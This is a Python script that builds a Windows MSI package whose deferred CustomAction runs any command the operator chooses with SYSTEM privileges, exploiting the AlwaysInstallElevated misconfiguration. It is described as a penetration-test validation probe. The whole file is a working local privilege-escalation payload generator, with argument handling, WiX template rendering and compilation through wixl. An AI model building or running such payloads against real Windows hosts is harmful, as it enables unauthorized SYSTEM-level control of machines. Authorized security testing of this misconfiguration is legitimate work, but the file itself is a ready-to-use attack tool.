#!/usr/bin/env python3
"""
Generate a Windows MSI that runs a deferred CustomAction in LocalSystem
context when invoked via `msiexec /quiet /qn /i <msi>` against a target
with AlwaysInstallElevated=1 (HKLM + HKCU).

Pure-Python wrapper around `wixl` (from msitools). No msfvenom, no
metasploit. Used as a validation probe: stage the MSI on the target,
trigger it under a low-priv user, observe that the deferred command ran
in SYSTEM context.
"""
from __future__ import annotations

import argparse
import shutil
import subprocess
import sys
import tempfile
import uuid
import xml.sax.saxutils as sx
from pathlib import Path


TEMPLATE = Path(__file__).parent / "templates" / "aie-trigger.wxs.j2"


def render(command: str, work: Path) -> Path:
    if not command.strip():
        raise ValueError("--command must be non-empty")
    if any(c in command for c in ("\x00", "\r", "\n")):
        raise ValueError("--command must not contain NUL, CR, or LF bytes")

    # Template uses Property=CmdExe (cmd.exe) + ExeCommand=<args>.
    # Normalize: strip a leading `cmd /c` / `cmd.exe /c`, then prepend `/c `.
    normalized = command.strip()
    low = normalized.lower()
    for prefix in ("cmd.exe /c ", "cmd /c "):
        if low.startswith(prefix):
            normalized = normalized[len(prefix):]
            break
    exe_args = "/c " + normalized

    marker = work / "marker.txt"
    marker.write_text("aie-response-probe\n")

    wxs = TEMPLATE.read_text()
    wxs = wxs.replace("{{ upgrade_code }}", "{" + str(uuid.uuid4()).upper() + "}")
    wxs = wxs.replace("{{ component_guid }}", "{" + str(uuid.uuid4()).upper() + "}")
    wxs = wxs.replace("{{ marker_source }}", str(marker))
    wxs = wxs.replace("{{ command_xml_escaped }}", sx.escape(exe_args, {'"': "&quot;"}))

    out = work / "aie-trigger.wxs"
    out.write_text(wxs)
    return out


def compile_msi(wxs: Path, out_msi: Path) -> None:
    cmd = ["wixl", "-v", "-o", str(out_msi), str(wxs)]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(
            f"wixl failed ({r.returncode}):\n--stdout--\n{r.stdout}\n--stderr--\n{r.stderr}"
        )


def build(command: str, out: Path, keep_workdir: bool = False) -> Path:
    if not shutil.which("wixl"):
        raise RuntimeError("wixl not on PATH (nix-shell -p msitools)")

    work = Path(tempfile.mkdtemp(prefix="aie_probe_"))
    try:
        wxs = render(command, work)
        compile_msi(wxs, out)
        return out
    finally:
        if not keep_workdir:
            shutil.rmtree(work, ignore_errors=True)


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument(
        "--command",
        required=True,
        help="Command string the deferred SYSTEM-context CustomAction will run",
    )
    p.add_argument("--out", required=True, type=Path)
    p.add_argument(
        "--keep-workdir",
        action="store_true",
        help="Preserve the temp WiX work dir for inspection",
    )
    args = p.parse_args()

    args.out.parent.mkdir(parents=True, exist_ok=True)
    msi = build(args.command, args.out, args.keep_workdir)
    print(f"[+] MSI written: {msi}  ({msi.stat().st_size} bytes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
